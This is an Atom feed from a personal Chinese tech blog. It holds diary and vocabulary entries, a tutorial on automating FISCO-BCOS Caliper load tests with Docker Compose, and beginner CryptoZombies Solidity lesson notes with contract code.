<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>XiaoYue</title>
  
  <subtitle>以梦为马,不负韶华</subtitle>
  <link href="https://x1a0.net/atom.xml" rel="self"/>
  
  <link href="https://x1a0.net/"/>
  <updated>2022-07-08T19:05:34.099Z</updated>
  <id>https://x1a0.net/</id>
  
  <author>
    <name>肖越</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>屠鸭日记1</title>
    <link href="https://x1a0.net/2022/07/08/%E5%B1%A0%E9%B8%AD%E6%97%A5%E8%AE%B01/"/>
    <id>https://x1a0.net/2022/07/08/%E5%B1%A0%E9%B8%AD%E6%97%A5%E8%AE%B01/</id>
    <published>2022-07-08T12:33:08.000Z</published>
    <updated>2022-07-08T19:05:34.099Z</updated>
    
    <content type="html"><![CDATA[<p>词汇量1000<br>2020年7月8日</p><hr><p>忽略，无视<br>ignore, neglect, overlook, pay no attention</p><p>毁坏<br>destruction, destroy, damage</p><p>错误的观点<br>misconception, inaccurate view, mistaken view</p><p>容易达到的<br>accessible, approachable, easy to reach</p><p>检查，调查<br>investigate, inquiry, enquiry, survey, inspect, detect, probe, dig into, look into</p><p>表地点<br>where, place, spot, geographical location</p><p>原因<br>reason, cause, factor, because of, due to, thanks to, as a result of, as a consequence of, result from</p><p>保护<br>protect, guard, safeguard, shield, preserve, conservation</p><p>媒体<br>newspaper, medium, press</p><p>变暖<br>calefy, get warmer, global warming</p><p>遭遇，面对<br>encounter, confront, suffer, face, sustain, run up against</p><p>改变<br>revision, change, alter, turn, modify, conversation, alteration</p><p>重要的<br>key, essential, primary, dominant, vital, important, significant, monumental, critical, imperative, fundamental, crucial</p><p>烦死了 这个pinata 这个护网 耽误掉好多时间</p><p>不看抖音</p><p>不看抖音</p><p>不看抖音</p><p>！！！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;词汇量1000&lt;br&gt;2020年7月8日&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;忽略，无视&lt;br&gt;ignore, neglect, overlook, pay no attention&lt;/p&gt;
&lt;p&gt;毁坏&lt;br&gt;destruction, destroy, damage&lt;/p&gt;
&lt;p&gt;错误</summary>
      
    
    
    
    
    <category term="屠鸭" scheme="https://x1a0.net/tags/%E5%B1%A0%E9%B8%AD/"/>
    
  </entry>
  
  <entry>
    <title>2022.5.28日记</title>
    <link href="https://x1a0.net/2022/05/28/2022-5-28%E6%97%A5%E8%AE%B0/"/>
    <id>https://x1a0.net/2022/05/28/2022-5-28%E6%97%A5%E8%AE%B0/</id>
    <published>2022-05-27T16:42:43.000Z</published>
    <updated>2022-05-27T16:51:04.277Z</updated>
    
    <content type="html"><![CDATA[<p>今天是2022年5月28号</p><p>挺搞笑的一件事，不知道能不能在博客里写哈哈哈。</p><p>现在是凌晨00:43，本来要跟项目方交东西的，先写个日记平复下心情吧。</p><p>有个小伙子说要来教我做人，我以为有二三十个，没想到一个人来了。不知道该不该报警，该说不说报警有点怂。。哈哈哈，但要是有人看到这篇日记一定记得，这种情况得报警。冲进来就嘞着我脖子，我反手抓起双节棍就是一挥。最后他灰溜溜的走了。</p><p>现在问题吧，就是怕他百折不挠的来找我报复，明着来不怕，就怕冷不伶仃的背后来一刀。哈哈哈。这种事情也是可能发生的嘛，要是我哪天不在了，大家一定要来翻看这篇博客。（手动捂脸）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天是2022年5月28号&lt;/p&gt;
&lt;p&gt;挺搞笑的一件事，不知道能不能在博客里写哈哈哈。&lt;/p&gt;
&lt;p&gt;现在是凌晨00:43，本来要跟项目方交东西的，先写个日记平复下心情吧。&lt;/p&gt;
&lt;p&gt;有个小伙子说要来教我做人，我以为有二三十个，没想到一个人来了。不知道该不该报警，该说</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>2022.5.9日记</title>
    <link href="https://x1a0.net/2022/05/09/2022-5-9%E6%97%A5%E8%AE%B0/"/>
    <id>https://x1a0.net/2022/05/09/2022-5-9%E6%97%A5%E8%AE%B0/</id>
    <published>2022-05-09T12:10:46.000Z</published>
    <updated>2022-05-09T12:34:22.987Z</updated>
    
    <content type="html"><![CDATA[<p>好久没跟新博客了，刚打开微信看到x1a0.net这个域名才发现，原来我还有个博客。</p><p>不想写东西的原因有很多吧，太忙、太累、太麻烦。 恩，我们好像总能给不想做的事情找到很多原因。<br>也可能是感觉标签和分类太难搞了。</p><p>最近一直失眠，通宵。不知道啥原因但是已经好多天没上过课了。</p><p>重温一下了scorpion，不错的美剧，一时兴起又想研究短波通信了。</p><p>好困，背单词去了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;好久没跟新博客了，刚打开微信看到x1a0.net这个域名才发现，原来我还有个博客。&lt;/p&gt;
&lt;p&gt;不想写东西的原因有很多吧，太忙、太累、太麻烦。 恩，我们好像总能给不想做的事情找到很多原因。&lt;br&gt;也可能是感觉标签和分类太难搞了。&lt;/p&gt;
&lt;p&gt;最近一直失眠，通宵。不知道啥</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Ubuntu-install-Oracle</title>
    <link href="https://x1a0.net/2022/02/26/Ubuntu-install-Oracle/"/>
    <id>https://x1a0.net/2022/02/26/Ubuntu-install-Oracle/</id>
    <published>2022-02-25T17:56:14.000Z</published>
    <updated>2022-02-25T17:56:14.083Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>FISCO-BCOS Caliper压测自动化脚本</title>
    <link href="https://x1a0.net/2022/01/17/FISCO-BCOS%20Caliper%E5%8E%8B%E6%B5%8B%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC/"/>
    <id>https://x1a0.net/2022/01/17/FISCO-BCOS%20Caliper%E5%8E%8B%E6%B5%8B%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC/</id>
    <published>2022-01-16T16:14:34.000Z</published>
    <updated>2022-01-20T02:10:41.377Z</updated>
    
    <content type="html"><![CDATA[<p>是在一次项目中遇到的问题:</p><ol><li>需自定义合约函数压测</li><li>需自定义链节点数量</li><li>必须使用Docker模式搭链</li><li>Docker节点需要自定义配置(CPU、内存等)</li></ol><p>那么作为FiscoBcos社区光荣的一份子呢，决定把这次问题记录下来，并公开自动化脚本。<br>分几节写了问题解决方案，脚本在最后。求个Start~</p><p>感觉首先需要了解这三个文件：</p><ul><li>基准配置文件 —— config.yaml <code>指定测试速率，工作负载模块路径等</code></li><li>基准网络配置文件 —— fisco-bcos.json <code>测试的环境不同就不一样</code></li><li>工作负载模块文件 —— workload.js <code>随便命名，写哪都行</code></li></ul><hr><h3 id="『1』自定义测压合约"><a href="#『1』自定义测压合约" class="headerlink" title="『1』自定义测压合约"></a>『1』自定义测压合约</h3><p>使用自定义合约进行压测是需要编写工作负载模块的，这个㐓直接服用 👉🏻<a href="https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/tutorial/stress_testing.html">FiscoBcos关于caliper测压的官方文档</a> ，执行完后查看例子其实就大概知道怎么编写了。如果需要深入了解请看 👉🏻<a href="https://hyperledger.github.io/caliper/v0.4.2/workload-module/#example">官方文档</a> 这里就大概提一下，基本改动就是函数输入部分。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateWorkload</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> workload = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; txnPerBatch; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> w = &#123;</span><br><span class="line">            <span class="string">&#x27;transaction_type&#x27;</span>: <span class="string">&#x27;set(string)&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;hello! - from &#x27;</span> + process.pid.toString(),</span><br><span class="line">        &#125;;</span><br><span class="line">        workload.push(w);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> workload;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports.run = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> args = generateWorkload();</span><br><span class="line">    <span class="keyword">return</span> bc.invokeSmartContract(contx, <span class="string">&#x27;helloworld&#x27;</span>, <span class="string">&#x27;v0&#x27;</span>, args, <span class="literal">null</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由于项目不能公开，所以拿模板实例中的helloword作为例子。<br>这里txnPerBatch代表每一批次执行多少次set函数。  </p><p>例子中txnPerBatch是等于1的，可以在generateWorkload()函数中看到往workload中存入了txnPerBatch笔交易，最后通过传入的适配器实例bc.invokeSmartContract调用合约。一批次执行多次还没测试过，不过项目用不到。 </p><p>如果和我一样只需要一批次执行一次，那么只要给invokeSmartContract的第四个参数传个dict就行了，可以直接定义需要的数据类型：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> sendRrgs = &#123;</span><br><span class="line">            <span class="string">&#x27;transaction_type&#x27;</span>:<span class="string">&#x27;_set_(address,bytes32,uint256,uint256,uint256)&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;_addr&#x27;</span>: <span class="string">&#x27;hello! - from &#x27;</span> + process.pid.toString()</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125;;</span><br><span class="line"><span class="keyword">return</span> bc.invokeSmartContract(contx, <span class="string">&#x27;helloworld&#x27;</span>, <span class="string">&#x27;v0&#x27;</span>, sendRrgs, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>然后在测试文件config.yaml的回调函数栏填上此工作负载模块位置即可。  </p><hr><h3 id="『2』自定义节点数量"><a href="#『2』自定义节点数量" class="headerlink" title="『2』自定义节点数量"></a>『2』自定义节点数量</h3><p>由于每次压测需要不同的节点数量，一下4个一下100个，这个时候就需要使用build_chain脚本生成具有相应节点的链。大致记录下，需要深入了解请看 👉🏻<a href="https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/manual/build_chain.html">FISCO开发部署工具官方文档</a> .</p><p>这里有个坑，如果使用2.8.0版本搭链就会报错，因为不兼容。当时查了好久不能共识的原因，没想到是不兼容。😌官方教程也是推荐docker搭建的，但是在给到build_chain链接的时候并没有注明版本，是个坑。</p><p>经测试2.7.2是可以完美运行的： 👉🏻<a href="https://gitee.com/FISCO-BCOS/FISCO-BCOS/blob/v2.7.2/tools/build_chain.sh">下载地址</a></p><p>下面是多节点单群祖配置方法，由于机器上还有别的节点占用端口，所以选用了30700,20700,7545</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash build_chain.sh -l 127.0.0.1:n -p 30700,20700,7545</span><br></pre></td></tr></table></figure><p>使用docker搭链的话为了更好的启动这些节点，需要写一个docker-compose.yaml，笔者是容器小白，队里大佬已经写好了，见下节。</p><hr><h3 id="『3』使用docker搭链"><a href="#『3』使用docker搭链" class="headerlink" title="『3』使用docker搭链"></a>『3』使用docker搭链</h3><p>由于这次项目需要对压测节点进行监控，所以必须使用docker进行压测。在官方教程里也是推荐使用docker搭链，下面简述下流程。</p><p>上面已经生成了相应的节点，这个时候使用docker启动即可：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">node0:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">fiscoorg/fiscobcos:latest</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;20700:20700&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;7545:7545&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;30700:30700&quot;</span></span><br><span class="line">    <span class="attr">working_dir:</span> <span class="string">/data</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./node0:/data</span></span><br><span class="line">    <span class="attr">deploy:</span></span><br><span class="line">      <span class="attr">resources:</span></span><br><span class="line">        <span class="attr">limits:</span></span><br><span class="line">          <span class="attr">cpus:</span> <span class="string">&#x27;0.1&#x27;</span></span><br><span class="line">          <span class="attr">memory:</span> <span class="string">240M</span></span><br><span class="line">        <span class="attr">reservations:</span></span><br><span class="line">          <span class="attr">cpus:</span> <span class="string">&#x27;0.1&#x27;</span></span><br><span class="line">          <span class="attr">memory:</span> <span class="string">200M</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">node0</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">/usr/local/bin/fisco-bcos</span> <span class="string">-c</span> <span class="string">config.ini</span></span><br><span class="line"> </span><br><span class="line">  <span class="attr">node1:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">fiscoorg/fiscobcos:latest</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;20701:20702&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;7546:7546&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;30701:30701&quot;</span></span><br><span class="line">    <span class="attr">working_dir:</span> <span class="string">&quot;/data&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./node1:/data</span></span><br><span class="line">    <span class="attr">deploy:</span> </span><br><span class="line">      <span class="attr">resources:</span> </span><br><span class="line">        <span class="attr">limits:</span> </span><br><span class="line">          <span class="attr">cpus:</span> <span class="string">&#x27;0.1&#x27;</span> </span><br><span class="line">          <span class="attr">memory:</span> <span class="string">240M</span></span><br><span class="line">        <span class="attr">reservations:</span> </span><br><span class="line">          <span class="attr">cpus:</span> <span class="string">&#x27;0.1&#x27;</span> </span><br><span class="line">          <span class="attr">memory:</span> <span class="string">200M</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">node1</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">/usr/local/bin/fisco-bcos</span> <span class="string">-c</span> <span class="string">config.ini</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;node0&quot;</span></span><br></pre></td></tr></table></figure><p>启动和结束命令：（写在fisco-bocs.json中common字段下）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;start&quot;</span>: <span class="string">&quot;docker-compose -f docker-compose.yaml up -d; sleep 3s&quot;</span>,</span><br><span class="line"><span class="string">&quot;end&quot;</span>: <span class="string">&quot;docker-compose -f docker-compose.yaml down&quot;</span></span><br></pre></td></tr></table></figure><p>以上命令㐓启动具有相应CPU和内存的docker节点，并把数据挂载到相应节点data目录下。<br><strong>需要特别注意的是几个目录</strong>  </p><ol><li><strong>节点文件目录[需要在docker-compose文件的volumes下指定把这个目录挂载到容器中的/data目录下]</strong>  </li><li><strong>config.yaml文件目录[启动caliper时需要指定]</strong></li><li><strong>fisco-bcos.josn文件目录[启动caliper时需要指定]</strong></li><li><strong>workload文件目录[需要在config.yaml文件中指定]</strong></li></ol><hr><h3 id="『4』一劳永逸"><a href="#『4』一劳永逸" class="headerlink" title="『4』一劳永逸"></a>『4』一劳永逸</h3><p>上述问题解决后就可以编写自动化脚本了，其实脚本就是在做上面的事情。</p><p>我们可以发现进行一次压测的流程：<br><strong>前提是工作负载模块、合约、SDK都已配置完毕</strong></p><ol><li>使用build_chain.sh工具生成相应节点</li><li>编辑docker-compose文件把所有节点需要的docker环境配好（如果有100个节点，就要复制100遍node进行修改）</li><li>编辑config.yaml文件，将所有需要监控的容器名字放到dockername下面</li><li>执行压测代码</li></ol><p>如果现在有个自动化脚本能够执行上面的所有事情，<br>“<strong>只要输入节点数量就能自动开启测压</strong>“的梦想将在下面实现:  </p><p><img src="https://img-blog.csdnimg.cn/afebe71297bb4d418d04ef63e6875053.gif"></p><p>脚本地址： 👉🏻 <a href="https://github.com/xiaoyue2019/fiscoCaliperSc">xiaoyue2019</a></p><blockquote><p><em><strong>注意：不要盲目相信这个小脚本。此脚本并不能从零开始协助搭建，还是需要有些基础的喂</strong></em></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;是在一次项目中遇到的问题:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;需自定义合约函数压测&lt;/li&gt;
&lt;li&gt;需自定义链节点数量&lt;/li&gt;
&lt;li&gt;必须使用Docker模式搭链&lt;/li&gt;
&lt;li&gt;Docker节点需要自定义配置(CPU、内存等)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;那么作为Fisc</summary>
      
    
    
    
    <category term="区块链" scheme="https://x1a0.net/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="FISCOBCOS" scheme="https://x1a0.net/categories/FISCOBCOS/"/>
    
    <category term="Caliper" scheme="https://x1a0.net/categories/Caliper/"/>
    
    
    <category term="区块链" scheme="https://x1a0.net/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="fiscobcos" scheme="https://x1a0.net/tags/fiscobcos/"/>
    
    <category term="caliper" scheme="https://x1a0.net/tags/caliper/"/>
    
  </entry>
  
  <entry>
    <title>加密僵尸第二课过关小记</title>
    <link href="https://x1a0.net/2021/12/19/%E5%8A%A0%E5%AF%86%E5%83%B5%E5%B0%B8%E7%AC%AC%E4%BA%8C%E8%AF%BE%E8%BF%87%E5%85%B3%E5%B0%8F%E8%AE%B0/"/>
    <id>https://x1a0.net/2021/12/19/%E5%8A%A0%E5%AF%86%E5%83%B5%E5%B0%B8%E7%AC%AC%E4%BA%8C%E8%AF%BE%E8%BF%87%E5%85%B3%E5%B0%8F%E8%AE%B0/</id>
    <published>2021-12-18T16:01:13.000Z</published>
    <updated>2021-12-21T11:40:57.701Z</updated>
    
    <content type="html"><![CDATA[<h3 id="第二关「映射和地址」"><a href="#第二关「映射和地址」" class="headerlink" title="第二关「映射和地址」"></a>第二关「映射和地址」</h3><p><img src="https://img.learnblockchain.cn/attachments/2020/02/Rlg50klq5e3d01469751f.png"></p><ul><li>以太坊账户地址就是公钥keccak256的后20位</li><li>合约地址和用户地址有区别的，区别是啥不可言传(￣.￣)</li></ul><p>映射就是Python里面的字典</p><ul><li>mapping (uint =&gt; address) public xx;</li></ul><p>通关代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory &#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">event <span class="title">NewZombie</span><span class="params">(uint zombieId, string name, uint dna)</span></span>;</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = <span class="number">16</span>;</span><br><span class="line">    uint dnaModulus = <span class="number">10</span> ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie &#123;</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Zombie[] <span class="keyword">public</span> zombies;</span><br><span class="line"></span><br><span class="line">    mapping (uint =&gt; address) <span class="keyword">public</span> zombieToOwner;</span><br><span class="line"></span><br><span class="line">    mapping (address =&gt; uint) ownerZombieCount;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">_createZombie</span><span class="params">(string _name, uint _dna)</span> <span class="keyword">private</span> </span>&#123;</span><br><span class="line">        uint id = zombies.push(Zombie(_name, _dna)) - <span class="number">1</span>;</span><br><span class="line">        NewZombie(id, _name, _dna);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">_generateRandomDna</span><span class="params">(string _str)</span> <span class="keyword">private</span> view <span class="title">returns</span> <span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        uint rand = uint(keccak256(_str));</span><br><span class="line">        <span class="keyword">return</span> rand % dnaModulus;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">createRandomZombie</span><span class="params">(string _name)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        uint randDna = _generateRandomDna(_name);</span><br><span class="line">        _createZombie(_name, randDna);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="第三关「msg-sender」"><a href="#第三关「msg-sender」" class="headerlink" title="第三关「msg.sender」"></a>第三关「msg.sender」</h3><p>msg.sender是一个全局变量，代表着当前调用合约的地址</p><ul><li>更新mapping内的值 varmapping[id]++;</li><li>Python里面这个只能是取出来，要更新还得==，奇怪</li><li>刚刚测试了下，+=123,varmapping=varmapping+123都是可以的</li><li><strong>说明这个是取的地址而不是值</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory &#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">event <span class="title">NewZombie</span><span class="params">(uint zombieId, string name, uint dna)</span></span>;</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = <span class="number">16</span>;</span><br><span class="line">    uint dnaModulus = <span class="number">10</span> ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie &#123;</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Zombie[] <span class="keyword">public</span> zombies;</span><br><span class="line"></span><br><span class="line">    mapping (uint =&gt; address) <span class="keyword">public</span> zombieToOwner;</span><br><span class="line">    mapping (address =&gt; uint) ownerZombieCount;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">_createZombie</span><span class="params">(string _name, uint _dna)</span> <span class="keyword">private</span> </span>&#123;</span><br><span class="line">        uint id = zombies.push(Zombie(_name, _dna)) - <span class="number">1</span>;</span><br><span class="line">        zombieToOwner[id] = msg.sender;</span><br><span class="line">        ownerZombieCount[msg.sender]++;</span><br><span class="line">        NewZombie(id, _name, _dna);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">_generateRandomDna</span><span class="params">(string _str)</span> <span class="keyword">private</span> view <span class="title">returns</span> <span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        uint rand = uint(keccak256(_str));</span><br><span class="line">        <span class="keyword">return</span> rand % dnaModulus;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">createRandomZombie</span><span class="params">(string _name)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        uint randDna = _generateRandomDna(_name);</span><br><span class="line">        _createZombie(_name, randDna);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="第四关「require」"><a href="#第四关「require」" class="headerlink" title="第四关「require」"></a>第四关「require」</h3><ul><li>require(1==1) 只要判断为TRUE就往下执行</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(ownerZombieCount[msg.sender] == <span class="number">0</span>);</span><br></pre></td></tr></table></figure><hr><h3 id="第五关「继承-Inheritance」"><a href="#第五关「继承-Inheritance」" class="headerlink" title="第五关「继承 Inheritance」"></a>第五关「继承 Inheritance」</h3><ul><li>contract xiaobai is dog {小白的特有属性}</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">contract ZombieFeeding is ZombieFactory &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="第六关「引入」"><a href="#第六关「引入」" class="headerlink" title="第六关「引入」"></a>第六关「引入」</h3><ul><li>import “./acontract.sol”</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;./zombiefactory.sol&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="第七关「僵尸的DNA」"><a href="#第七关「僵尸的DNA」" class="headerlink" title="第七关「僵尸的DNA」"></a>第七关「僵尸的DNA」</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./zombiefactory.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFeeding is ZombieFactory &#123;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">feedAndMultiply</span><span class="params">(uint _zombieId, uint _targetDna)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    require(msg.sender == zombieToOwner[_zombieId]);</span><br><span class="line">    Zombie storage myZombie = zombies[_zombieId];</span><br><span class="line">    _targetDna = _targetDna % dnaModulus;</span><br><span class="line">    uint newDna = (myZombie.dna + _targetDna) / <span class="number">2</span>;</span><br><span class="line">    _createZombie(<span class="string">&quot;NoName&quot;</span>, newDna);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="第八关「函数可见性」"><a href="#第八关「函数可见性」" class="headerlink" title="第八关「函数可见性」"></a>第八关「函数可见性」</h3><p>internal 和 external</p><ul><li>private合约外不能调用，但继承的合约也调用不了了所以需要internal</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;第二关「映射和地址」&quot;&gt;&lt;a href=&quot;#第二关「映射和地址」&quot; class=&quot;headerlink&quot; title=&quot;第二关「映射和地址」&quot;&gt;&lt;/a&gt;第二关「映射和地址」&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://img.learnblockchain.</summary>
      
    
    
    
